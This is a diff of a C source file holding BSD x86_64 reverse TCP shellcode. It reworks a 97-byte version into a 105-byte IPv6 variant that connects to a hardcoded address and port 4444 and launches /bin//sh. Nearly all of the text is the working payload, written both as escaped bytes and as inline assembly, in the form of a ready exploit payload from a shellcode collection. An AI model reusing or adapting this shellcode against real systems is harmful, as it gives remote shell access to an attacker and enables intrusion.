@@ -1,5 +1,5 @@
 /*
-BSD x86_64 reverse_tcp shellcode, 97 bytes
+BSD x86_64 ipv6 reverse_tcp shellcode, 105 bytes
 Balazs Bucsay
 @xoreipeip | earthquake <at@> rycon <do.t> hu  
 http://rycon.hu
@@ -7,17 +7,17 @@ http://rycon.hu
 port = 4444
 ip = ::1
 
-The shellcode contains some null bytes, that can be removed easily with
-some shellcoding experience. But it increases the length of the code with 
-a few additional bytes.
+The shellcode contains lots null bytes, because the ipv6 address is stored
+at the end (::1 is hardcoded, that is why).
 
 char shellcode[] = \
 "\x6a\x61\x58\x99\x6a\x1c\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x04\x3e\x0f\x05"
-"\xff\xc6\x04\x59\x0f\x05\xff\xce\xff\xce\x04\x58\x0f\x05\x52\x48\xbb\x00"
-"\x00\x00\x00\x00\x00\x00\x01\x53\x48\xc7\xc3\x00\x00\x00\x00\x53\x48\xc7"
-"\xc3\x00\x1c\x11\x5c\x53\x48\x89\xe6\x6a\x1c\x5a\x66\x83\xc0\x62\x0f\x05"
-"\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57"
-"\x48\x89\xe6\x04\x3b\x0f\x05"
+"\xff\xc6\x04\x59\x0f\x05\xff\xce\xff\xce\x04\x58\x0f\x05\xe9\x23\x00\x00"
+"\x00\x5e\x6a\x1c\x5a\x66\x83\xc0\x62\x0f\x05\x99\x52\x48\xbf\x2f\x2f\x62"
+"\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x04\x3b\x0f\x05"
+"\xe8\xd8\xff\xff\xff"
+"\x00\x1c\x11\x5c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00";
 */
 
 int main() 
@@ -49,15 +49,10 @@ int main()
         "       add $88, %al            \n"
         "       syscall                 \n"
 
-	// connect(s, struct, 28) - compiler optimizes the movs :( 
-	"	push %rdx		\n"
-	"	mov $0x0100000000000000, %rbx\n" // ipv6 addr1
-	"	push %rbx		\n"
-	"	mov $0x0000000000000000, %rbx\n" // ipv6 addr2
-	"	push %rbx		\n"
-	"	mov $0x000000005c111c00, %rbx\n" // port etc
-	"	push %rbx		\n"
-	"	mov %rsp, %rsi		\n"
+	// connect(s, struct, 28)
+	"	jmp forth		\n"
+	"back:				\n"
+	"	pop %rsi		\n"	
 	"	push $28	  	\n"
 	"	pop %rdx		\n"
 	"	add $98, %ax\n"
@@ -74,5 +69,14 @@ int main()
 	"	mov %rsp, %rsi		\n"
 	"	add $59, %al		\n"
 	"	syscall	   		\n"
+	"forth:			\n"
+	"	call back		\n"
+	"	.long 0x5c111c00	\n"
+	"	.long 0x00000000	\n"
+	"	.long 0x00000000	\n"
+	"	.long 0x00000000	\n"
+	"	.long 0x00000000	\n"
+	"	.long 0x01000000	\n"
+	"	.long 0x00000000	\n"
 	);
 }
